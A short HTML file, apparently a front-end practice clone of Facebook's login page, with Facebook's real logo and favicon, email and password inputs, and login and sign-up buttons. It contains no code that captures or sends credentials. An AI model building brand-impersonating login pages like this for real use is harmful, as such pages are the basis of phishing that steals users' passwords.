<!DOCTYPE html>
<html lang="en">

<head>
    
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico">
    <title>Facebook - log in or sign in</title>
    <link rel="stylesheet" href="./CSS/Style.css">

<body>

    <div class="container">

        <div class="left">
            <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>

        <div class="right">
            <div class="login-box">
                <input type="text" placeholder="Email or phone number">
                <input type="password" placeholder="Password">
                <button class="login-btn">Log In</button>
                <a href="#" class="forgot">Forgot password?</a>
                <hr>
                <button class="create-btn">Create new account</button>
            </div>
            <p class="page-text">
                <strong>Create a Page</strong> for a celebrity, brand or business.
            </p>
        </div>
    </div>

</body>
</head>

</html>
